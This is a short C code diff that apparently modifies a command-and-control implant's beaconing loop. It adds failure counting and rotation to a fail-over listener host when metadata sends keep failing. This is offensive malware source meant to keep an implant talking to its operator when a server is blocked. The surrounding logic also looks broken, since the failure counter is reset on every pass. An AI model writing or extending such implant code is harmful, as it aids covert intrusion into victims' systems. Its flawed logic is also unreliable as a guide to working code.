@@ -1,6 +1,7 @@
 #include "agent.h"
 #include "package.h"
 #include "TaskController.h"
+#include "ListManager.h"
 
 pAgent agent = { 0 };
 
@@ -33,6 +34,11 @@ void AgentRoutine() {
 			if ((PackageSendMetaDataPackage(agent->MetaDataPackage, NULL, NULL)) != PACKAGE_SUCCESS) {
 				printf("[error] attempting to send package\n");
 				agent->config->listenerConfig->CurrentHost->NumFailures++;
+				if (agent->config->listenerConfig->CurrentHost->NumFailures >= MAX_HOST_FAILURES)
+				{
+					agent->config->listenerConfig->CurrentHost->NumFailures = 0;
+					SelectHost(HOST_ROTATION_FAIL_OVER);
+				}
 			}
 			agent->config->listenerConfig->CurrentHost->NumFailures = 0;
 		}
